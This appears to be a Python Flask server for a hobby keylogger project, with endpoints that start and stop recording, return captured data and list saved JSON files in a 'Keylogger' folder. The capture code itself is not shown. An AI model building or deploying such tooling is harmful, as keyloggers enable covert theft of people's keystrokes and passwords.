import json
import os
from flask import Flask, jsonify
from manager import Manager
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
record = Manager()


@app.route('/startRecording', methods=['POST'])
def startRecording():
    record.start_recording()
    return jsonify({"message": "הסקריפט הופעל בהצלחה!"}), 200

@app.route('/stopRecording', methods=['POST'])
def stopRecording():
    record.stop_recording()
    return jsonify({"message": "הסקריפט הופעל בהצלחה!"}), 200

@app.route('/receiveData', methods=['GET'])
def receiveData():
    data = record.data.enter_to_dic()
    return jsonify(data)


@app.route('/files', methods=['GET'])
def files():
    directory = "C:/Users/shuki/Desktop/Keylogger/"

    # בודק שהתיקייה קיימת
    if not os.path.exists(directory):
        return jsonify({"error": "Directory not found"}), 404

    # מוצא את כל הקבצים עם סיומת .json
    json_files = [file for file in os.listdir(directory) if file.endswith(".json")]

    return json_files

if __name__ == '__main__':
    app.run(debug=True)
